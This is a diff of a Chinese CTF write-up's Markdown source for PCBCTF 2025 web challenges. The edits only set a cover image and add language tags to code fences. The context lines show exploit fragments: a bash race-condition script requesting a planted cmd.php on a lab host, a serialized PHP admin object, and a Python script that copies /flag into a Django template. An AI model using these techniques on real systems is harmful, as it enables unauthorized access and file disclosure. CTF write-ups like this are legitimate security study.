@@ -4,7 +4,7 @@ description: "PCBCTF 2025 Web方向比赛WP，整理解题思路、关键利用�
 pubDate: "2026-01-01"
 updatedDate: "2026-01-01"
 tags: ["CTF", "Web安全", "WP"]
-cover: auto
+cover: "1782888588142..jpeg"
 coverAlt: "PCBCTF2025 Web 解出汇总 的文章封面"
 draft: false
 ---
@@ -31,7 +31,7 @@ Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6
 
 条件竞争
 
-```
+```bash
 #!/bin/bash
 request(){
     curl -fs "http://192.168.18.26:25002/tmp/cmd.php"
@@ -66,7 +66,7 @@ wait
 ## Django
 
 pickle反序列化
-```
+```python
 def copy_file(request):
     if request.method == "POST":
         src = request.POST.get('src', '')
@@ -89,7 +89,7 @@ def copy_file(request):
 这里存在一个复制文件的功能，且没有过滤
 
 尝试将/flag复制到模板上利用Django渲染成功得解
-```
+```python
 import requests
 TARGET_URL = "http://192.168.18.27:25003" 
 TARGET_TEMPLATE = "templates/copy.html" 
